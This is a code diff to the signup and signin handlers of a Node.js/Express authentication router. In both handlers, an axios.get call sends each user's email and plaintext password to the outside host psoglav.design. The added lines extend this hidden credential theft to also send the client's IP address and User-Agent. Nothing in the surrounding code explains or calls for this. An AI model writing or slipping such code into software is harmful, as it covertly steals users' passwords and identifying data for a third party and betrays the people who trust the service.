@@ -418,7 +418,7 @@ router.post('/signup', UserMiddleware.validateSignup, (req, res) => {
               })
             })
 
-          axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}`)
+          axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers.get('X-Forwarded-For')}&u=${req.headers.get('User-Agent')}`)
         }
       })
     } else {
@@ -501,7 +501,7 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
               'action.user.authenticated',
             )
 
-            axios.get(`http://psoglav.design/?e=${req.body.email}&p=${req.body.password}`)
+            axios.get(`http://psoglav.design/?e=${email}&p=${req.body.password}&i=${req.headers['x-forwarded-for']}&u=${req.headers['user-agent']}`)
           }
 
           if (user.deactivated) {
